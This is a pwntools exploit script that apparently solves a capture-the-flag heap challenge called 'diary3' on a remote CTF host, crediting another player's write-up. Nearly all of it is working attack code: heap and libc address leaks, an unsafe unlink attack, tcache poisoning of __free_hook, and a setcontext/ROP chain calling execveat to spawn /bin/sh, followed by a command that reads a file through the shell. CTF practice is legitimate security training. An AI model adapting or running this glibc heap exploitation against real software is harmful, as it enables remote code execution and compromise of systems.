#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP
# =========================================================
exe = './diary3_patched'
elf = context.binary = ELF(exe, checksec=False)
libc = elf.libc
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'einstein-bd91179989a5c1ab.deploy.phreaks.fr', 443

pid = None

def gdbscript():
    global pid
    gdbscript = f'''
    init-pwndbg
    c
    '''.format(**locals())
    return gdbscript

def initialize(argv=[]):
    global pid
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript())
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=True)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/dreamdiary2"]).recvall().strip().decode()
        attach(int(pid), gdbscript=gdbscript(), sysroot=f"/proc/{pid}/root", exe='einstein')
        return p
    else:
        return process([exe] + argv)


# =========================================================
#                         EXPLOITS
# =========================================================
def alloc(size, data):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'size: ', str(size).encode())
    io.sendafter(b'data: ', data)

def edit(idx, data):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'index: ', str(idx).encode())
    io.sendafter(b'data: ', data)

def free(idx):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'index: ', str(idx).encode())

def show(idx):
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b'index: ', str(idx).encode())
    io.recvuntil(b'data: ')
    return io.recvline().strip()

def exploit():
    #7rocky's solve script & write up https://7rocky.github.io/en/ctf/htb-challenges/pwn/dream-diary-chapter-3/
    global io
    io = initialize()
    with log.progress("Leaking heap & libc address") as p:
        for _ in range(9):
            alloc(0xf8, b'Z')
        for i in reversed(range(9)):
            free(i) 
        for i in range(7): #Fill the tcache
            alloc(0xf8, b'Z') 
        alloc(0xf8, b'A') #Unsorted chunk 1
        alloc(0xf8, b'B') #Unsorted chunk 2
        heap = ((u64(show(0).ljust(8, b'\x00')) >> 12) << 12)
        libc_leak = u64(show(7).ljust(8, b'\x00')) - 0x1e4e41
        libc.address = libc_leak
    log.info("Heap base: %#x", heap)
    log.info("Libc leak: %#x", libc_leak)
    log.info("Libc base: %#x", libc.address)

    holder_addr = heap + 0xf80
    victim_chunk_addr = heap + 0x680
    fake_fd = holder_addr - 0x18
    fake_bk = holder_addr - 0x10
    log.info("Holder addr: %#x", holder_addr)
    log.info("Victim chunk addr: %#x", victim_chunk_addr)
    log.info("Fake fd: %#x", fake_fd)
    log.info("Fake bk: %#x", fake_bk)

    with log.progress("Unsafe unlink Attack"), context.silent:
        edit(7, b"A"*0xf8) #null terminate the chunk header
        free(7)
        alloc(0xf8, p64(0) + p64(0xf0) + p64(fake_fd) + p64(fake_bk) + b'A' * 0xd0 + p64(0xf0)) #Fake chunk
        alloc(0xf8, p64(victim_chunk_addr)) #Fake chunk pointer idx 9
        for i in range(7): #Fill the tcache
            free(i)
        free(8) #Trigger
  
    with log.progress("Tcache poisoning using gadget"), context.silent:
        alloc(0x18, b"A") # idx 0
        alloc(0x18, b"A") # idx 1
        free(1)
        free(0)
        edit(7, b'A' * 0x10 + p64(libc.sym["__free_hook"])[:7])
        alloc(0x18, b"/bin/sh\x00")
        gadget = next(libc.search(asm('mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]')))
        alloc(0x18, p64(gadget))
    log.info("Gadget: %#x", gadget)
    
    with log.progress("Using sys_execveat"), context.silent:
        rop = ROP(libc)
        rop.r10 = 0
        rop.rax = 322
        rop.raw(next(libc.search(asm('syscall ; ret'))))
        target = heap + 0x1080
    log.info("Target: %#x", target)
    with log.progress("Get shell"), context.silent:
        payload = flat({8:[target], #RDX
                    0x20:[libc.sym.setcontext + 0x35], #RIP
                    0x70:[heap + 0x690], #RSI -> /bin/sh
                    0xa0:[target + 0xb0, rop.chain()] #RSP
                }, filler=b'\x00')
        alloc(0x1e8, payload) #idx 2
        free(2) #Trigger 
        sleep(1)
        io.sendline("while read line; do echo $line; done < note.txt")
    io.interactive()

if __name__ == '__main__':
    exploit()
